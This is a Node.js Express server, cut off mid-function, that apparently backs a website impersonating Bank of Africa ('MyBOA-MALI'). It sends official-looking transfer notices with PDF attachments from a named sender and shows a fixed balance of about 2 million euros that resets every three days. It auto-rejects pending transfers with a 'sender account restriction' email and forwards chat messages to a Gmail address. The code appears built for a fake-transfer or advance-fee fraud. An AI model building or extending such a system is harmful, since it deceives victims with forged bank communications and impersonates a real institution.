const express = require('express');
const cors    = require('cors');
const https   = require('https');
const { MongoClient } = require('mongodb');

const MONGODB_URI = process.env.MONGODB_URI;
const isProduction = process.env.NODE_ENV === 'production';

if (isProduction && (!MONGODB_URI || MONGODB_URI.trim() === '')) {
    console.error('MONGODB_URI manquante en production. Démarrage interrompu.');
    process.exit(1);
}

const BREVO_API_KEY = process.env.BREVO_API_KEY;
if (!BREVO_API_KEY) {
    console.warn('Warning : BREVO_API_KEY manquante. Les notifications par email seront désactivées.');
}

const DB_NAME = 'myboamali';
const COLLECTION_NAME = 'dashboard';

let db = null;

async function connectDB() {
    if (!MONGODB_URI || MONGODB_URI.trim() === '') {
        if (!isProduction) {
            console.warn("Mode local : fallback mémoire chat actif, données non persistantes.");
        }
        return;
    }
    try {
        const client = new MongoClient(MONGODB_URI);
        await client.connect();
        db = client.db(DB_NAME);
        console.log('MongoDB connecte avec succes');
    } catch(e) {
        console.error('Erreur MongoDB:', e);
        if (isProduction) {
            console.error('Erreur de connexion MongoDB en production.');
        } else {
            console.warn("Mode local : fallback mémoire chat actif, données non persistantes.");
        }
    }
}

connectDB();

const app = express();
app.use(cors({
    origin: ['https://myboamali.onrender.com', 'https://myboamali.net', 'https://www.myboamali.net', 'http://localhost:3000', 'http://127.0.0.1:5500'],
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Origin']
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

app.post('/send-virement', (req, res) => {
    try {
        const { email_beneficiaire, nom_beneficiaire, montant, devise, reference, date, bic, iban, motif, pays, pdf_base64, civilite } = req.body;

        if (!email_beneficiaire || !pdf_base64) {
            return res.status(400).json({ success: false, message: 'Email et PDF requis' });
        }

        const pdfData = pdf_base64.replace(/^data:[^;]+;[^,]+,/, '').replace(/\s/g, '');
        console.log('PDF base64 length:', pdfData.length);
        console.log('PDF first 50 chars:', pdfData.substring(0, 50));

        var dateServeur = new Date().toLocaleString('fr-FR', {
            timeZone: 'Africa/Abidjan',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });

        const htmlContent = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;font-family:Georgia,serif;background:#f4f4f4;">
<div style="max-width:600px;margin:0 auto;background:white;">

<div style="background:#1D6F4F;height:6px;"></div>

<div style="background:white;padding:24px 40px 16px;border-bottom:1px solid #eee;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td>
<div style="font-size:18px;font-weight:bold;color:#0f1923;letter-spacing:1px;">BANK OF AFRICA</div>
<div style="font-size:10px;color:#888;letter-spacing:2px;margin-top:2px;">BMCE GROUP - MyBOA-MALI</div>
</td>
<td align="right">
<div style="font-size:10px;color:#888;">Bamako, le ${dateServeur}</div>
<div style="font-size:10px;color:#888;margin-top:2px;">Ref: ${reference}</div>
</td>
</tr>
</table>
</div>

<div style="background:white;padding:30px 40px;">

<div style="margin-bottom:24px;">
<div style="font-size:11px;color:#888;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;font-family:Arial,sans-serif;">Objet</div>
<div style="font-size:14px;font-weight:bold;color:#0f1923;font-family:Arial,sans-serif;">Avis de reception d un ordre de virement international</div>
</div>

<p style="font-size:13px;color:#333;line-height:1.8;margin:0 0 16px;">${civilite || 'Madame, Monsieur'} <strong>${nom_beneficiaire}</strong>,</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 16px;">
Nous avons le plaisir de vous informer qu un ordre de virement international a ete emis en votre faveur par <strong>BRUNET JEAN PAUL</strong> via la plateforme <strong>MyBOA-MALI</strong> - Bank Of Africa.
</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 24px;">
Ce virement est actuellement <strong>en attente de traitement</strong>. Les fonds seront credites sur votre compte dans un delai de <strong>2 a 5 jours ouvrables</strong> selon les procedures interbancaires internationales en vigueur.
</p>

<div style="border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;margin-bottom:24px;">
<div style="background:#0f1923;padding:10px 16px;">
<span style="color:white;font-size:12px;font-weight:bold;letter-spacing:1px;font-family:Arial,sans-serif;">RECAPITULATIF DU VIREMENT</span>
</div>
<table width="100%" style="border-collapse:collapse;font-family:Arial,sans-serif;">
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;width:45%;">Reference</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${reference}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Montant</td>
<td style="padding:10px 16px;font-size:13px;color:#1D6F4F;font-weight:bold;border-bottom:1px solid #eee;">${montant} ${devise || 'CFA'}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Date d emission</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${dateServeur}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">BIC / SWIFT</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${bic}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">IBAN</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${iban}</td>
</tr>
<tr>
<td style="padding:10px 16px;font-size:12px;color:#666;border-bottom:1px solid #eee;">Pays</td>
<td style="padding:10px 16px;font-size:12px;color:#0f1923;font-weight:bold;border-bottom:1px solid #eee;">${pays}</td>
</tr>
<tr style="background:#f9f9f9;">
<td style="padding:10px 16px;font-size:12px;color:#666;">Statut</td>
<td style="padding:10px 16px;"><span style="background:#fff3cd;color:#856404;font-size:11px;font-weight:bold;padding:3px 10px;border-radius:10px;font-family:Arial,sans-serif;">En attente de traitement</span></td>
</tr>
</table>
</div>

<div style="border-left:3px solid #1D6F4F;padding:12px 16px;background:#f4fbf7;margin-bottom:24px;border-radius:0 6px 6px 0;">
<p style="font-size:13px;color:#1D6F4F;font-weight:bold;margin:0 0 4px;font-family:Arial,sans-serif;">Document officiel joint</p>
<p style="font-size:12px;color:#555;margin:0;font-family:Arial,sans-serif;">Veuillez trouver ci-joint l avis de virement officiel au format PDF. Conservez ce document comme preuve de transaction.</p>
</div>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 8px;">Nous restons a votre disposition pour toute question relative a cette operation.</p>
<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 24px;">Veuillez agreer, ${civilite || 'Madame, Monsieur'}, l expression de nos salutations distinguees.</p>

<div style="font-size:13px;color:#0f1923;font-weight:bold;font-family:Arial,sans-serif;">MyBOA-MALI - Bank Of Africa</div>
<div style="font-size:11px;color:#888;margin-top:2px;font-family:Arial,sans-serif;">Service des operations internationales</div>
<div style="font-size:11px;color:#888;font-family:Arial,sans-serif;">support@myboamali.net</div>
</div>

<div style="background:#0f1923;padding:14px 40px;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td style="font-size:10px;color:rgba(180,200,210,0.7);font-family:Arial,sans-serif;">2026 BANK OF AFRICA - MyBOA-MALI - Tous droits reserves</td>
<td style="text-align:right;font-size:10px;color:#4CAF50;font-weight:bold;font-family:Arial,sans-serif;">www.myboamali.net</td>
</tr>
</table>
</div>

<div style="background:#1D6F4F;height:4px;"></div>

</div>
</body>
</html>`;

        // Répondre immédiatement au client
        res.json({ success: true, message: 'Email envoye avec succes' });

        // Envoyer l'email après 4 minutes
        setTimeout(function() {
            const emailData = JSON.stringify({
                sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
                to: [{ email: email_beneficiaire, name: nom_beneficiaire }],
                subject: 'MyBOA-MALI - Avis de virement en votre faveur - Ref: ' + reference,
                htmlContent: htmlContent,
                attachment: [{
                    content: pdfData,
                    name: 'Avis-Virement-' + reference + '.pdf',
                    type: 'application/pdf'
                }]
            });

            const options = {
                hostname: 'api.brevo.com',
                port: 443,
                path: '/v3/smtp/email',
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'api-key': BREVO_API_KEY
                }
            };

            const reqBrevo = https.request(options, (resBrevo) => {
                let data = '';
                resBrevo.on('data', (chunk) => { data += chunk; });
                resBrevo.on('end', () => {
                    console.log('Brevo delayed status:', resBrevo.statusCode, data);
                });
            });

            reqBrevo.on('error', (e) => {
                console.error('Erreur Brevo delayed:', e);
            });

            reqBrevo.write(emailData);
            reqBrevo.end();

        }, 4 * 60 * 1000); // 4 minutes

    } catch (error) {
        console.error('Erreur serveur:', error);
        res.status(500).json({ success: false, message: 'Erreur: ' + error.message });
    }
});

app.post('/send-certicode', (req, res) => {
    try {
        const { email, passcode, time } = req.body;

        if (!email || !passcode) {
            return res.status(400).json({ success: false, message: 'Email et code requis' });
        }

        const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8"></head>
        <body style="font-family:Arial,sans-serif;background:#f4f4f4;margin:0;padding:0;">
        <div style="max-width:500px;margin:0 auto;background:white;">
            <div style="background:#0f1923;padding:20px 30px;">
                <table width="100%"><tr>
                    <td><div style="color:white;font-size:13px;font-weight:bold;">BANK OF AFRICA</div>
                    <div style="color:rgba(180,200,210,0.8);font-size:10px;">BMCE GROUP - MyBOA-MALI</div></td>
                    <td align="right"><div style="color:white;font-size:16px;font-weight:bold;">CODE D'ACCÈS SÉCURISÉ</div></td>
                </tr></table>
            </div>
            <div style="background:#1D6F4F;height:4px;"></div>
            <div style="padding:30px;">
                <p style="color:#333;font-size:15px;">Bonjour,</p>
                <p style="color:#666;font-size:13px;line-height:1.6;">
                    Votre code d'accès sécurisé MyBOA-MALI est :
                </p>
                <div style="background:#0f1923;border-radius:10px;padding:20px;text-align:center;margin:20px 0;">
                    <div style="color:rgba(180,200,210,0.8);font-size:11px;margin-bottom:10px;">CODE D'ACCÈS</div>
                    <div style="color:white;font-size:36px;font-weight:bold;letter-spacing:8px;">${passcode}</div>
                    <div style="color:#1D6F4F;font-size:12px;margin-top:10px;">Valable jusqu'à ${time}</div>
                </div>
                <div style="background:#fff8e1;border:1px solid #f39c12;border-radius:6px;padding:12px;margin-top:20px;">
                    <div style="color:#e67e22;font-size:12px;font-weight:bold;">⚠ SÉCURITÉ</div>
                    <div style="color:#666;font-size:12px;margin-top:4px;">Ne partagez jamais ce code. MyBOA-MALI ne vous demandera jamais ce code par téléphone ou email.</div>
                </div>
            </div>
            <div style="background:#0f1923;padding:15px 30px;text-align:center;">
                <p style="color:rgba(100,120,140,0.9);font-size:10px;margin:3px 0;">2026 BANK OF AFRICA - MyBOA-MALI</p>
                <p style="color:#4CAF50;font-weight:bold;font-size:10px;margin:3px 0;">www.myboamali.net</p>
            </div>
        </div>
        </body>
        </html>`;

        const emailData = JSON.stringify({
            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
            to: [{ email: email, name: 'Client MyBOA-MALI' }],
            subject: 'MyBOA-MALI - Votre code d acces securise',
            htmlContent: htmlContent
        });

        const options = {
            hostname: 'api.brevo.com',
            port: 443,
            path: '/v3/smtp/email',
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'api-key': BREVO_API_KEY
            }
        };

        const reqBrevo = https.request(options, (resBrevo) => {
            let data = '';
            resBrevo.on('data', (chunk) => { data += chunk; });
            resBrevo.on('end', () => {
                console.log('Certicode Brevo status:', resBrevo.statusCode, data);
                if (resBrevo.statusCode === 201) {
                    res.json({ success: true });
                } else {
                    res.status(500).json({ success: false, message: data });
                }
            });
        });

        reqBrevo.on('error', (e) => {
            res.status(500).json({ success: false, message: e.message });
        });

        reqBrevo.write(emailData);
        reqBrevo.end();

    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/reset-solde', async (req, res) => {
    try {
        if (db) {
            await db.collection(COLLECTION_NAME).updateOne(
                { _id: 'dashboard' },
                { $set: { solde: 1311914000 } },
                { upsert: true }
            );
        }
        res.json({ success: true, message: 'Solde réinitialisé à 1 311 914 000 CFA (2 000 000 EUR)' });
    } catch(error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/get-data', async (req, res) => {
    try {
        var data = null;
        if (db) {
            data = await db.collection(COLLECTION_NAME).findOne({ _id: 'dashboard' });
        }
        if (!data) {
            data = {
                _id: 'dashboard',
                solde: 1311914000,
                date_dernier_virement: null,
                devise_affichage: 'CFA',
                historique: [],
                notifications: [],
                notif_non_lues: 0
            };
        }
        // Vérifier réinitialisation 3 jours
        if (data.date_dernier_virement) {
            var maintenant = new Date().getTime();
            var dernierVirement = new Date(data.date_dernier_virement).getTime();
            var troisJours = 3 * 24 * 60 * 60 * 1000;
            if (maintenant - dernierVirement >= troisJours) {
                data.solde = 1311914000;
                data.date_dernier_virement = null;
                data.historique = [];
                data.notifications = [];
                data.notif_non_lues = 0;
                if (db) {
                    await db.collection(COLLECTION_NAME).updateOne(
                        { _id: 'dashboard' },
                        { $set: data },
                        { upsert: true }
                    );
                }
            }
        }

        // Vérifier les virements expirés (rejet automatique)
        var virementsRejetes = [];
        if (data.historique && data.historique.length > 0) {
            data.historique = data.historique.map(function(op) {
                if (op.statut === 'En attente de traitement' && op.date_expiration) {
                    var maintenant = new Date().getTime();
                    var expiration = new Date(op.date_expiration).getTime();
                    if (maintenant >= expiration) {
                        op.statut = 'Rejeté';
                        
                        // Recréditer le montant sur le solde
                        var montantStr = (op.montant || '0').toString().replace(/\s/g, '').replace(',', '.');
                        var montantVirement = parseFloat(montantStr) || 0;
                        var deviseVirement = op.devise || 'CFA';
                        var tauxConversion = { CFA:1, EUR:655.957, USD:600, GBP:750, CHF:620, CAD:450 };
                        var montantCFA = deviseVirement === 'CFA' ? montantVirement : montantVirement * (tauxConversion[deviseVirement] || 1);
                        data.solde = (data.solde || 0) + montantCFA;
                        console.log('Recrédit solde:', montantCFA, 'CFA pour virement', op.reference);

                        // Ajouter notification de recrédit
                        data.notifications = data.notifications || [];
                        data.notifications.unshift({
                            id: Date.now(),
                            message: 'Virement ' + op.reference + ' rejeté — ' + op.montant + ' ' + deviseVirement + ' recrédité sur votre compte',
                            type: 'rejet',
                            date: new Date().toLocaleString('fr-FR'),
                            lue: false
                        });
                        data.notif_non_lues = (data.notif_non_lues || 0) + 1;

                        virementsRejetes.push(op);
                    }
                }
                return op;
            });
            
            if (virementsRejetes.length > 0) {
                // Sauvegarder les changements (historique, solde, notifications)
                if (db) {
                    await db.collection(COLLECTION_NAME).updateOne(
                        { _id: 'dashboard' },
                        { $set: { 
                            historique: data.historique,
                            solde: data.solde,
                            notifications: data.notifications,
                            notif_non_lues: data.notif_non_lues
                        } },
                        { upsert: true }
                    );
                }
                
                // Envoyer email de rejet pour chaque virement rejeté
                for (var i = 0; i < virementsRejetes.length; i++) {
                    var vir = virementsRejetes[i];
                    if (vir.email_beneficiaire) {
                        // Utiliser l'API de géolocalisation pour détecter le fuseau horaire
                        // basé sur l'IP ou le pays du bénéficiaire
                        var paysBeneficiaire = (vir.pays || 'France').trim();

                        var fuseauxHoraires = {
                            'France': 'Europe/Paris',
                            'Mali': 'Africa/Bamako',
                            'Cote d\'Ivoire': 'Africa/Abidjan',
                            'Côte d\'Ivoire': 'Africa/Abidjan',
                            'Ivory Coast': 'Africa/Abidjan',
                            'Senegal': 'Africa/Dakar',
                            'Sénégal': 'Africa/Dakar',
                            'Burkina Faso': 'Africa/Ouagadougou',
                            'Niger': 'Africa/Niamey',
                            'Guinee': 'Africa/Conakry',
                            'Guinée': 'Africa/Conakry',
                            'Belgique': 'Europe/Brussels',
                            'Suisse': 'Europe/Zurich',
                            'Canada': 'America/Toronto',
                            'Maroc': 'Africa/Casablanca',
                            'Tunisie': 'Africa/Tunis',
                            'Algerie': 'Africa/Algiers',
                            'Algérie': 'Africa/Algiers',
                            'USA': 'America/New_York',
                            'Etats-Unis': 'America/New_York',
                            'États-Unis': 'America/New_York',
                            'Royaume-Uni': 'Europe/London',
                            'Espagne': 'Europe/Madrid',
                            'Italie': 'Europe/Rome',
                            'Allemagne': 'Europe/Berlin',
                            'Portugal': 'Europe/Lisbon',
                            'Chine': 'Asia/Shanghai',
                            'Japon': 'Asia/Tokyo',
                            'Dubai': 'Asia/Dubai',
                            'Dubaï': 'Asia/Dubai',
                            'Cameroun': 'Africa/Douala',
                            'Congo': 'Africa/Kinshasa',
                            'Gabon': 'Africa/Libreville',
                            'Togo': 'Africa/Lome',
                            'Benin': 'Africa/Porto-Novo',
                            'Bénin': 'Africa/Porto-Novo',
                            'Ghana': 'Africa/Accra',
                            'Nigeria': 'Africa/Lagos',
                            'Nigéria': 'Africa/Lagos'
                        };

                        // Fuseau du pays du bénéficiaire
                        var fuseauBeneficiaire = fuseauxHoraires[paysBeneficiaire] || 'Europe/Paris';

                        // Fuseau du serveur (Mali/Abidjan = UTC+0)
                        var fuseauServeur = 'Africa/Abidjan';

                        var maintenant = new Date();

                        // Date formatée selon le fuseau du bénéficiaire
                        var dateRejetBeneficiaire = maintenant.toLocaleString('fr-FR', {
                            timeZone: fuseauBeneficiaire,
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit'
                        });

                        // Date formatée selon le fuseau du serveur (Mali)
                        var dateRejetServeur = maintenant.toLocaleString('fr-FR', {
                            timeZone: fuseauServeur,
                            day: '2-digit',
                            month: '2-digit',
                            year: 'numeric',
                            hour: '2-digit',
                            minute: '2-digit'
                        });

                        var dateRejet = dateRejetBeneficiaire;

                        var htmlRejet = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="margin:0;padding:0;font-family:Arial,sans-serif;background:#f4f4f4;">
<div style="max-width:600px;margin:0 auto;background:white;">

<div style="background:#1D6F4F;height:6px;"></div>

<div style="background:#0f1923;padding:20px 30px;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td>
<div style="color:white;font-size:14px;font-weight:bold;letter-spacing:1px;">BANK OF AFRICA</div>
<div style="color:rgba(180,200,210,0.7);font-size:10px;margin-top:2px;">BMCE GROUP - MyBOA-MALI</div>
</td>
<td align="right">
<div style="color:white;font-size:15px;font-weight:bold;">AVIS DE REJET</div>
<div style="color:rgba(180,200,210,0.7);font-size:10px;margin-top:2px;">Virement international refuse</div>
</td>
</tr>
</table>
</div>

<div style="background:#1D6F4F;height:3px;"></div>

<div style="background:#f8f9fa;padding:12px 30px;border-bottom:1px solid #eee;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td style="font-size:10px;color:#999;">Reference<br><strong style="color:#1a1a1a;font-size:13px;">${vir.reference}</strong></td>
<td style="font-size:10px;color:#999;">Date du rejet<br><strong style="color:#1a1a1a;font-size:13px;">${dateRejet}</strong></td>
<td align="right"><span style="background:#c0392b;color:white;padding:4px 10px;border-radius:12px;font-size:10px;font-weight:bold;">VIREMENT REFUSE</span></td>
</tr>
</table>
</div>

<div style="background:white;padding:28px 30px;">

<p style="font-size:14px;color:#333;margin:0 0 20px;">${vir.civilite || 'Monsieur'} <strong>${vir.nom_beneficiaire}</strong>,</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 20px;">
Nous vous informons que le virement international d un montant de
<strong>${vir.montant} ${vir.devise || 'CFA'}</strong>, envoye par
<strong>Monsieur Jean Paul Brunet</strong>, prevu sur votre compte
<strong>${vir.iban || '---'}</strong>, n a pas pu etre traite.
</p>

<div style="border-left:3px solid #c0392b;padding:12px 16px;background:#fdf2f2;margin-bottom:20px;border-radius:0 6px 6px 0;">
<p style="font-size:13px;color:#c0392b;font-weight:bold;margin:0 0 6px;">Motif du rejet</p>
<p style="font-size:13px;color:#555;margin:0;">
Le compte de l emetteur presente une restriction empechant le traitement du virement.
</p>
</div>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 24px;">
Le montant n a pas ete credite sur votre compte et sera reverse sur le compte de l emetteur.
</p>

<p style="font-size:13px;color:#444;line-height:1.9;margin:0 0 4px;">Cordialement,</p>
<p style="font-size:13px;color:#0f1923;font-weight:bold;margin:0 0 2px;">Bank of Africa</p>
<p style="font-size:12px;color:#888;margin:0;">Service Client</p>

</div>

<div style="background:#0f1923;padding:14px 30px;">
<table width="100%" style="border-collapse:collapse;">
<tr>
<td style="font-size:10px;color:rgba(180,200,210,0.6);">2026 BANK OF AFRICA - MyBOA-MALI - Tous droits reserves</td>
<td style="text-align:right;font-size:10px;color:#4CAF50;font-weight:bold;">www.myboamali.net</td>
</tr>
</table>
</div>

<div style="background:#1D6F4F;height:4px;"></div>

</div>
</body>
</html>`;

                        const emailRejetData = JSON.stringify({
                            sender: { name: 'MyBOA-MALI', email: 'noreply@myboamali.net' },
                            to: [{ email: vir.email_beneficiaire, name: vir.nom_beneficiaire }],
                            subject: 'MyBOA-MALI - Avis de rejet de virement - Ref: ' + vir.reference,
                            htmlContent: htmlRejet
                        });

                        const optionsRejet = {
                            hostname: 'api.brevo.com',
                            port: 443,
                            path: '/v3/smtp/email',
                            method: 'POST',
                            headers: {
                                'Accept': 'application/json',
                                'Content-Type': 'application/json',
                                'api-key': BREVO_API_KEY
                            }
                        };

                        await new Promise((resolve) => {
                            const reqRejet = https.request(optionsRejet, (resRejet) => {
                                let dataRejet = '';
                                resRejet.on('data', (chunk) => { dataRejet += chunk; });
                                resRejet.on('end', () => {
                                    console.log('Email rejet envoye pour', vir.reference, '- Status:', resRejet.statusCode);
                                    resolve();
                                });
                            });
                            reqRejet.on('error', (e) => { console.error('Erreur email rejet:', e); resolve(); });
                            reqRejet.write(emailRejetData);
                            reqRejet.end();
                        });
                    }
                }
            }
        }
        res.json({ success: true, data: data });
    } catch(error) {
        console.error('Erreur get-data:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

app.post('/save-data', async (req, res) => {
    try {
        var newData = req.body;
        if (!newData) return res.status(400).json({ success: false, message: 'Donnees manquantes' });
        
        // Ajouter date_expiration aux nouveaux virements si non présente
        if (newData.historique && Array.from(newData.historique).length > 0) {
            newData.historique.forEach(function(op) {
                if (op.statut === 'En attente de traitement' && !op.date_expiration) {
                    op.date_expiration = new Date(new Date().getTime() + 3 * 24 * 60 * 60 * 1000).toISOString();
                }
            });
        }

        newData._id = 'dashboard';
        if (db) {
            await db.collection(COLLECTION_NAME).updateOne(
                { _id: 'dashboard' },
                { $set: newData },
                { upsert: true }
            );
        }
        res.json({ success: true });
    } catch(error) {
        console.error('Erreur save-data:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// =========================================================================
// CUSTOM INTEGRATED CHAT V1 API ROUTES & HELPERS
// =========================================================================

// In-memory fallback database arrays if MongoDB connection is absent
let inMemoryConversations = [];
let inMemoryMessages = [];

function escapeHTML(text) {
    if (typeof text !== 'string') return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

function sendAgentEmailNotification(userDisplayName, userInitiales, userId, conversationId, messageContent) {
    if (!BREVO_API_KEY) {
        console.warn('BREVO_API_KEY non configurée. Email agent non envoyé.');
        return;
    }
    
    const escapedMessage = escapeHTML(messageContent);
    const dateStr = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Abidjan' });
    
    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"></head>
    <body style="font-family:Arial,sans-serif;background:#f4f4f4;margin:0;padding:20px;">
    <div style="max-width:600px;margin:0 auto;background:white;border-radius:8px;overflow:hidden;border:1px solid #ddd;">
        <div style="background:#0f1923;padding:20px;color:white;">
            <h2 style="margin:0;font-size:16px;">Nouveau message chat MyBOA-MALI</h2>
            <div style="font-size:11px;color:#888;margin-top:4px;">source : myboamali-web</div>
        </div>
        <div style="padding:24px;color:#333;font-size:14px;line-height:1.6;">
            <table style="width:100%;border-collapse:collapse;margin-bottom:20px;">
                <tr>
                    <td style="padding:6px 0;font-weight:bold;width:150px;">Nom Utilisateur :</td>
                    <td style="padding:6px 0;">${escapeHTML(userDisplayName)}</td>
                </tr>
                <tr>
                    <td style="padding:6px 0;font-weight:bold;">Initiales :</td>
                    <td style="padding:6px 0;">${escapeHTML(userInitiales)}</td>
                </tr>
                <tr>
                    <td style="padding:6px 0;font-weight:bold;">ID Utilisateur :</td>
                    <td style="padding:6px 0;"><code>${escapeHTML(userId)}</code></td>
                </tr>
                <tr>
                    <td style="padding:6px 0;font-weight:bold;">ID Conversation :</td>
                    <td style="padding:6px 0;"><code>${escapeHTML(conversationId)}</code></td>
                </tr>
                <tr>
                    <td style="padding:6px 0;font-weight:bold;">Date :</td>
                    <td style="padding:6px 0;">${dateStr}</td>
                </tr>
            </table>
            <div style="background:#f9f9f9;border-left:4px solid #1D6F4F;padding:15px;margin-top:10px;border-radius:4px;">
                <strong style="display:block;margin-bottom:6px;color:#1D6F4F;">Message :</strong>
                <div style="white-space:pre-wrap;font-family:inherit;">${escapedMessage}</div>
            </div>
            <div style="background:#fff8e1;border:1px solid #f39c12;border-radius:6px;padding:12px;margin-top:20px;font-size:12px;">
                <div style="color:#e67e22;font-weight:bold;">⚠ SÉCURITÉ</div>
                <div style="color:#666;margin-top:4px;">Cette conversation ne doit contenir aucune donnée bancaire sensible réelle.</div>
            </div>
        </div>
        <div style="background:#0f1923;padding:15px;text-align:center;font-size:10px;color:rgba(180,200,210,0.6);">
            2026 BANK OF AFRICA - MyBOA-MALI
        </div>
    </div>
    </body>
    </html>`;

    const emailData = JSON.stringify({
        sender: { name: 'MyBOA-MALI Chat Alert', email: 'noreply@myboamali.net' },
        to: [{ email: 'bankof739@gmail.com', name: 'Agent MyBOA-MALI' }],
        subject: 'Nouveau message chat MyBOA-MALI - ' + (userDisplayName || userId),
        htmlContent: htmlContent
    });

    const options = {
        hostname: 'api.brevo.com',
        port: 443,
        path: '/v3/smtp/email',
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'api-key': BREVO_API_KEY
        }
    };

    const reqBrevo = https.request(options, (resBrevo) => {
        let data = '';
        resBrevo.on('data', (chunk) => { data += chunk; });
        resBrevo.on('end', () => {
            console.log('Chat Alert Brevo status:', resBrevo.statusCode, data);
        });
    });

    reqBrevo.on('error', (e) => {
        console.error('Erreur envoi email alert Brevo:', e);
    });

    reqBrevo.write(emailData);
    reqBrevo.end();
}

// 1. POST /api/chat/messages
app.post('/api/chat/messages', async (req, res) => {
    try {
        if (isProduction && !db) {
            return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
        }

        const { userId, userDisplayName, userInitiales, userEmail, message, conversationId } = req.body;

        if (!userId) {
            return res.status(400).json({ success: false, error: 'userId requis' });
        }

        if (!message || typeof message !== 'string') {
            return res.status(400).json({ success: false, error: 'Message requis' });
        }

        const trimmedMessage = message.trim();
        if (trimmedMessage.length === 0) {
            return res.status(400).json({ success: false, error: 'Message vide refusé' });
        }

        if (trimmedMessage.length > 1000) {
            return res.status(400).json({ success: false, error: 'Message trop long (max 1000 caractères)' });
        }

        // Check if there is an active conversation for this user
        let conversation = null;
        if (db) {
            if (conversationId) {
                conversation = await db.collection('chatConversations').findOne({ conversationId: conversationId });
            } else {
                conversation = await db.collection('chatConversations').findOne({ userId: userId, archived: { $ne: true } });
            }
        } else {
            if (isProduction) {
                return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
            }
            console.warn("Mode local : fallback mémoire chat actif, données non persistantes.");
            if (conversationId) {
                conversation = inMemoryConversations.find(c => c.conversationId === conversationId);
            } else {
                conversation = inMemoryConversations.find(c => c.userId === userId && !c.archived);
            }
        }

        const now = new Date();
        const activeConvId = conversation ? conversation.conversationId : (conversationId || 'conv_' + userId);

        if (!conversation) {
            // Create conversation
            conversation = {
                conversationId: activeConvId,
                userId: userId,
                userDisplayName: userDisplayName || 'Client MyBOA-MALI',
                userInitiales: userInitiales || 'BJ',
                userEmail: userEmail || '',
                status: 'active',
                lastMessageAt: now,
                lastMessagePreview: trimmedMessage.substring(0, 60),
                unreadByAdmin: 1,
                unreadByUser: 0,
                source: 'myboamali-web',
                archived: false,
                createdAt: now,
                updatedAt: now
            };
            if (db) {
                await db.collection('chatConversations').insertOne(conversation);
            } else {
                if (isProduction) {
                    return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
                }
                inMemoryConversations.push(conversation);
            }
        } else {
            // Update conversation
            if (db) {
                await db.collection('chatConversations').updateOne(
                    { conversationId: activeConvId },
                    {
                        $set: {
                            lastMessageAt: now,
                            lastMessagePreview: trimmedMessage.substring(0, 60),
                            updatedAt: now,
                            userDisplayName: userDisplayName || conversation.userDisplayName,
                            userInitiales: userInitiales || conversation.userInitiales,
                            userEmail: userEmail || conversation.userEmail
                        },
                        $inc: { unreadByAdmin: 1 }
                    }
                );
            } else {
                if (isProduction) {
                    return res.status(503).json({ success: false, error: 'Service chat temporairement indisponible' });
                }
                conversation.lastMessageAt = now;
                conversation.lastMessagePreview = trimmedMessage.substring(0, 60);
                conversation.updatedAt = now;
                conversation.userDisplayName = userDisplayName || conversation.userDisplayName;
                conversation.userInitiales = userInitiales || conversation.userInitiales;
                conversation.userEmail = userEmail || conversation.userEmail;
                conversation.unreadByAdmin += 1;
            }
        }

        // Save message in chatMessages
        const messageDoc = {
            messageId: 'msg_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
            conversationId: activeConvId,
